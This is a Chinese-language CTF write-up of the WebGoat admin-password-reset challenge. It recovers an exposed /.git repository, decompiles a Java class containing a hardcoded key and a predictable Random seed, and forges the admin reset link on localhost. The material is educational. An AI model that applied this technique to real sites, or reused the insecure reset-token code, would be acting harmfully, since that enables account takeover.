---
id: CWE-527
title: Admin password reset
tags: 
    - CWE-527
    - CWE-798
    - CWE-335
---
<!-- muse start -->
检查 HTML 注释以及端点探测的信息收集，找到有趣的硬编码修改记录信息，并从 `/.git` 端点得到版本控制文件夹，进而还原代码文件，分析为硬编码及可预测的随机种子，最终得到密钥。
<!-- muse end -->

CWE-527	版本控制仓库暴露，`/.git` 目录获取历史提交记录
CWE-798	硬编码凭证，旧版代码中的密钥 `!!keykeykey!!`
CWE-335	伪随机数生成器中种子的不当使用，使用 Random 类并固定种子`paramString2.length()`，导致生成的密码重置链接可预测。


## Admin password reset

Try to reset the password for admin.

查看[示例解决方案](https://blog.csdn.net/qq_26545503/article/details/127273406)：

- 进行路径模糊测试，得到对 `.git` 的405响应
    `POST http://localhost:3000/WebGoat/challenge/7/.git HTTP/1.1`
- 或，查看 HTML 代码，得到注释内容后探测路径
    ```log
    ** Revision history (automatically added by: /challenge/7/.git/hooks)

    2e29cacb85ce5066b8d011bb9769b666812b2fd9 Updated copyright to 2017
    ac937c7aab89e042ca32efeb00d4ca08a95b50d6 Removed hardcoded key
    f94008f801fceb8833a30fe56a8b26976347edcf First version of WebGoat Cloud website
    ```

2. 使用 `git log` 得到的日志匹配 HTML 源代码的注释
    ```log
    commit 2e29cacb85ce5066b8d011bb9769b666812b2fd9 (HEAD -> master)
    Author: Nanne Baars <nanne.baars@owasp.org>
    Date:   Thu Aug 17 06:41:32 2017 +0200

        Updated copyright to 2017

    commit ac937c7aab89e042ca32efeb00d4ca08a95b50d6
    Author: Nanne Baars <nanne.baars@owasp.org>
    Date:   Thu Aug 17 06:41:09 2017 +0200

        Removed hardcoded key

    commit f94008f801fceb8833a30fe56a8b26976347edcf
    Author: Nanne Baars <nanne.baars@owasp.org>
    Date:   Thu Aug 17 06:40:04 2017 +0200

        First version of WebGoat Cloud website
    ```

3. 使用 `git show` 查看兴趣点 `Removed hardcoded key` 的提交记录    
    `git show ac937c7aab89e042ca32efeb00d4ca08a95b50d6`

    ```log
    commit ac937c7aab89e042ca32efeb00d4ca08a95b50d6
    Author: Nanne Baars <nanne.baars@owasp.org>
    Date:   Thu Aug 17 06:41:09 2017 +0200

        Removed hardcoded key

    diff --git a/PasswordResetLink.class b/PasswordResetLink.class
    index e4fd795..9328b99 100644
    Binary files a/PasswordResetLink.class and b/PasswordResetLink.class differ
    ```
    关联文件 `PasswordResetLink.class`

4. 定位 `Removed hardcoded key` 之前的版本 `f94008f801fceb8833a30fe56a8b26976347edcf`，进行还原
    `git checkout f94008f801fceb8833a30fe56a8b26976347edcf`

    得到包含硬编码密钥的文件 `PasswordResetLink.class`  
    :warning: 直接使用 vscode 扩展解码可能出错，此处使用 [`jd-gui`](https://github.com/java-decompiler/jd-gui)   

    ```java
    import java.util.Random;

    public class PasswordResetLink {
    public String createPasswordReset(String paramString1, String paramString2) {
        Random random = new Random();
        if (paramString1.equalsIgnoreCase("admin"))
        random.setSeed(paramString2.length()); 
        return scramble(random, scramble(random, scramble(random, MD5.getHashString(paramString1))));
    }
    
    public static String scramble(Random paramRandom, String paramString) {
        char[] arrayOfChar = paramString.toCharArray();
        for (byte b = 0; b < arrayOfChar.length; b++) {
        int i = paramRandom.nextInt(arrayOfChar.length);
        char c = arrayOfChar[b];
        arrayOfChar[b] = arrayOfChar[i];
        arrayOfChar[i] = c;
        } 
        return new String(arrayOfChar);
    }
    
    public static void main(String[] paramArrayOfString) {
        if (paramArrayOfString == null || paramArrayOfString.length != 1) {
        System.out.println("Need a username");
        System.exit(1);
        } 
        String str1 = paramArrayOfString[0];
        String str2 = "!!keykeykey!!";
        System.out.println("Generation password reset link for " + str1);
        System.out.println("Created password reset link: " + (new PasswordResetLink()).createPasswordReset(str1, str2));
        }
    }
    ```

5. 尝试运行此代码得到重置密钥，但此处使用了 `MD5` 文件于是
    1. `git checkout -f HEAD` 得到所有文件，其中包括 `MD5.class`
    2. 再次使用 `jd-gui` 将其转为 `.java` 文件

6. 运行程序得到重置密钥
    - 进入目录后运行
        `java PasswordResetLink.java admin`
        ```log
        Generation password reset link for admin
        Created password reset link: 375afe1104f4a487a73823c50a9292a2
        ```
    - 或修改文件直接运行

使用自己的 Web Goat 邮件进行密码重置，得到重置链接
`http://localhost:8080/WebGoat/challenge/7/reset-password/ca5fd10c5eb9ce8a6272b9e171984b60`
这里并非宿主机映射端口，于是手动修改为`3000`，并将密钥修改为`admin`的重置密钥
`http://localhost:3000/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2`

访问得到 Flag

或，看到仅使用参数2的长度作为随机种子的时候创建一批 MD5 码进行测试
`random.setSeed(paramString2.length()); `
